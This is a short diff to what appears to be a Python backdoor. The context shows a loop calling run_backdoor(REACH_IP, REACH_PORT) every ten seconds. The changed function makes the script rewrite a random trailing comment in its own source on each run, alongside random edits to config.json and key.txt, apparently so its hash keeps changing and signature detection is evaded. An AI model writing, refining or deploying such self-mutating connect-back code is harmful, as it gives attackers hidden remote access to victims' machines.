@@ -72,11 +72,21 @@ def add_random_comment_to_key_file(key_fpath):
 
 # default: modifies itself
 def append_comment_to_file(fpath=__file__):
-    comment_spacer = "\n# "
+    # Read the file contents
+    with open(fpath, "r") as file:
+        lines = file.readlines()
+    
+    # Check if the last line is a comment
+    if lines and lines[-1].strip().startswith("#"):
+        lines = lines[:-1]  # Remove the last line if it's a comment
+
+    comment_spacer = "# "
     comment = f"{comment_spacer}{random.randint(1, 1000000)}"
-    # add to end of file
-    with open(fpath, "a") as file:
-        file.write(comment)
+    lines.append(comment)
+
+    # lines (including new comment)
+    with open(fpath, "w") as file:
+        file.writelines(lines)
 
 update_json_with_random(convert_path("config.json"))
 add_random_comment_to_key_file(convert_path("key.txt"))
@@ -292,3 +302,4 @@ if __name__ == '__main__':
         run_backdoor(REACH_IP, REACH_PORT)
         # sleep for 10 sec
         time.sleep(10)
+# 749654
